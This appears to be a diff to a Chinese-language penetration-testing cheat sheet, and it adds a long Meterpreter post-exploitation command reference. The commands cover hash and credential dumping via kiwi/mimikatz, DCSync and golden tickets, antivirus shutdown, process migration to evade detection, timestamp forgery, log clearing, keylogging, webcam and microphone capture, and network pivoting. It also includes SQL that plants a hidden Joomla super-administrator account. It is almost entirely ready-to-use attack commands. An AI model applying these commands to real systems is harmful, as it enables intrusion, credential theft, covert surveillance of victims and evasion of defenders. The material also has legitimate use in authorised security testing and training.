@@ -24,33 +24,126 @@
 		+ 返回上级状态：``back``
 		+ 运行攻击模块：``exploit/run``
 		+ 查看当前连接会话：``sessions``
-	- meterpreter后渗透利用
-		+ 打印当前工作目录：``pwd``
-		+ 查看系统信息：``sysinfo``
-		+ 查看当前目标机上运行的进程列表和pid：``ps``
-		+ 调用相机拍摄照片：``webcam_snap``
-		+ 运行vnc远程查看屏幕：``run vnc``
-		+ 开启远程登录3389（windows）：``run post/windows/manage/enable_rdp``
-		+ 截取目标主机当前屏幕​：``screenshot``
-		+ 获取当前权限的用户id：``getuid``
-		+ 获取system权限：``getsystem``
-		+ 获取用户名与hash口令：``hashdump``
-		+ 获取目标主机shell(windows环境下中文乱码的解决办法:chcp 65001）：``shell``
++ meterpreter
+	- 基本系统命令
+		+ ``sessions -h`` ：查看帮助
+		+ ``sessions -i <ID值>`` ：进入会话   -k  杀死会话
+		+ ``background`` ：将当前会话放置后台
+		+ ``info`` ：查看已有模块信息
+		+ ``getuid`` ：查看获取的当前权限
+		+ ``getsystem`` ：提权
+		+ ``getpid`` ：获取当前进程的pid
+		+ ``sysinfo`` ：查看目标机系统信息
+		+ ``ps`` ：查看当前活跃进程    
+		+ ``kill <PID值>`` ：杀死进程
+		+ ``idletime`` ：查看目标机运行时间
+		+ ``hashdump`` ：从SAM数据库导出密码的哈希
+		+ ``reboot/shutdown`` ：重启/关机
+		+ ``shell`` ：进入目标机cmd shell,windows环境下中文乱码的解决办法:chcp 65001
 		+ 退出shell模式，返回到meterpreter：``Ctrl+Z``
-		+ 上传一个文件：``upload``
-		+ 下载一个文件：``download``
-		+ 执行目标系统中的文件(-f 指定文件，-i执行可交互模式，-H隐藏窗口)：``excute``
-		+ 清除日志：``clearev``
-		+ 将Meterpreter放入后台(使用session -i重新连接到会话)：``background``
-	- meterpreter内网渗透
-		+ 获取目标主机上的子网状态：``run get_local_subnets``
-		+ arp扫描内网机器：``run post/windows/gather/arp_scanner RHOSTS=192.168.100.0/24``
-		+ 使用autoroute模块添加到达内网的路由经session 1转发：``run autoroute -s 169.254.0.0/16 1``
-		+ 查看当前的路由表：``run autoroute -p``
-		+ 扫描内网存活主机：``db_nmap``
-		+ 将目标主机192.168.16.59的3389转发到本地主机的7070端口：``portfwd add -l 7070 -r 192.168.16.59 -p 3389``
-		+ 端口转发成功后就可以从本地端口连接rdp：``rdesktop 127.0.0.1:7070``
-
+		+ ``load kiwi`` ：加载wiki模块
+			::
+			
+				creds_all：列举所有凭据
+				creds_kerberos：列举所有kerberos凭据
+				creds_msv：列举所有msv凭据
+				creds_ssp：列举所有ssp凭据
+				creds_tspkg：列举所有tspkg凭据
+				creds_wdigest：列举所有wdigest凭据
+				dcsync：通过DCSync检索用户帐户信息
+				dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
+				golden_ticket_create：创建黄金票据
+				kerberos_ticket_list：列举kerberos票据
+				kerberos_ticket_purge：清除kerberos票据
+				kerberos_ticket_use：使用kerberos票据
+				kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
+				lsa_dump_sam：dump出lsa的SAM
+				lsa_dump_secrets：dump出lsa的密文
+				password_change：修改密码
+				wifi_list：列出当前用户的wifi配置文件
+				wifi_list_shared：列出共享wifi配置文件/编码
+		+ ``run`` ：使用扩展库，输入run后按两下tab列出已有的脚本
+			::
+			
+				run post/windows/manage/migrate                  #自动进程迁移    
+				run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上   
+				run post/linux/gather/checkvm                    # 是否虚拟机
+				run post/windows/manage/killav                   #关闭杀毒软件    
+				run post/windows/manage/enable_rdp               #开启远程桌面服务    
+				run post/windows/manage/autoroute                #查看路由信息    
+				run post/windows/gather/dumplinks                #获取最近的文件操作
+				run post/windows/gather/enum_logged_on_users     #列举当前登录的用户    
+				run post/windows/gather/enum_applications        #列举应用程序    
+				run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码    
+				run windows/gather/smart_hashdump                #dump出所有用户的hash
+		+ ``run killav`` ：关闭杀毒软件
+		+ ``run scraper`` : 查看目标主机详细信息
+	- execute执行文件
+		+ ``execute`` : 参数  -f 可执行文件   # 执行可执行程序
+		+ ``execute -H -i -f cmd.exe`` : 创建新进程cmd.exe，-H不可见，-i交互
+	- 目录/文件操作
+		+ ``pwd/getwd`` : 目标机器上当前目录(windows)
+		+ ``cd`` : 目标机器上切换目录
+		+ ``ls`` : 目标机器上显示
+		+ ``dir`` : 目标机器上查看
+		+ ``mkdir dir1 dir2`` : 
+		+ ``mv oldfile newfile`` : 
+		+ ``rmdir dir1`` : 
+		+ ``getlwd / lpwd`` : 查看攻击机当前目录(Linux)
+		+ ``lls`` : 在攻击机显示
+		+ ``lcd`` : 在攻击机上切换目录
+		+ ``cat C:\\Users\\zq\\Desktop\\123.txt`` : 目标机器上读取内容
+		+ ``edit C:\\Users\\zq\\Desktop\\123.txt`` : 篡改目标机器上的文件
+		+ ``search -f *.jsp -d e:\`` : 搜索E盘中所有以.jsp为后缀的文件
+		+ ``upload /test.x C:\\Users\\zq\\Desktop`` : 将文件传到目标机的桌面
+		+ ``download C:\\123.txt /root`` : 将目标机文件下载到/root目录下
+	- 时间戳伪造
+		+ ``timestomp C:// -h`` : 查看帮助
+		+ ``timestomp -v C://2.txt`` : 查看时间戳
+		+ ``timestomp C://2.txt -f C://1.txt`` : 将1.txt的时间戳复制给2.txt 
+	- 进程
+		+ ``ps`` : 查看目标主机活跃进程信息
+		+ ``getpid`` : 查看当前Meterpreter Shell的进程
+		+ ``migrate 1732`` : 将当前Meterpreter Shell的进程迁移到PID为1732的进程上，这样不容器被发现
+		+ ``kill <pid值>`` : 杀死进程
+	- 网络
+		+ ``run get_local_subnets`` : 获取目标主机上的子网状态
+		+ ``db_nmap`` : 扫描内网存活主机
+		+ ``arp`` 显示目标机器arp缓存
+		+ ``getproxy`` 显示目标机器的代理
+		+ ``ifconfig``
+		+ ``netstat -ano``
+		+ ``route``
+		+ ``portfwd`` 端口重定向
+		+ ``portfwd add -l 3389 -p 3389 -r 172.16.0.100`` 将目标机的3389端口转发到本地3389端口
+		+ 然后直接在本地使用命令远程登录：``rdesktop 127.0.0.1``
+	- 添加路由
+		+ run autoroute –h    # 查看帮助
+		+ run autoroute -s 192.168.159.0/24  # 添加到目标环境网络
+		+ run autoroute –p  # 查看添加的路由
+		+ 扫描
+			- ``run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24``
+			- ``run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389`` 
+	- uictl开关键盘/鼠标
+		+ ``uictl [enable/disable] [keyboard/mouse/all]`` 开启或禁止键盘/鼠标
+		+ ``uictl disable mouse`` 禁用鼠标
+		+ ``uictl disable keyboard`` 禁用键盘
+	- 用户接口命令（键盘嗅探，鼠标、屏幕、音频、摄像头）
+		+ ``keyscan_start`` : 开启键盘记录功能
+		+ ``keyscan_dump`` : 显示捕捉到的键盘记录信息
+		+ ``keyscan_stop`` : 停止键盘记录功能
+		+ ``mouse`` : 鼠标命令
+		+ ``screenshare`` : 屏幕监控
+		+ ``screenshot`` : 截图
+		+ ``record_mic`` : 音频
+		+ ``play *.wav`` : 播放音频
+		+ ``webcam_list`` : 查看目标主机的摄像头
+		+ ``webcam_snap`` : 目标主机摄像头拍照
+		+ ``webcam_stream`` : 目标主机通过摄像头开视频
+		+ ``webcam_chat -h`` : 开始与目标进行视频对话。
+		+ ``run vnc`` : 运行vnc远程查看屏幕
+	- clearav清除日志
+		+ clearev
 + vulmap【web】
 	- 项目地址：``https://github.com/zhzyker/vulmap``
 	- 安装
@@ -179,6 +272,12 @@
 		+ 设置cookie：``joomscan -u www.example.com --cookie "test=demo;"``
 		+ 随机UA：``joomscan -u www.example.com -r``
 		+ 设置代理：``joomscan -u www.example.com --proxy http://127.0.0.1:8080``
+	- 数据库权限改管理员密码
+		::
+		
+			以下两条命令成功创建joomla后台用户admin2/secret的超级管理员
+			INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`) VALUES ('Administrator2', 'admin2','d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199', '', NOW(), NOW(), NOW());
+			INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`) VALUES (LAST_INSERT_ID(),'8');
 + wpscan
 	- 插件漏洞:``wpscan --url https://www.xxxxx.wiki/ -e vp`` 
 	- 主题漏洞:``wpscan --url https://www.xxxxxx.wiki -e vt`` 
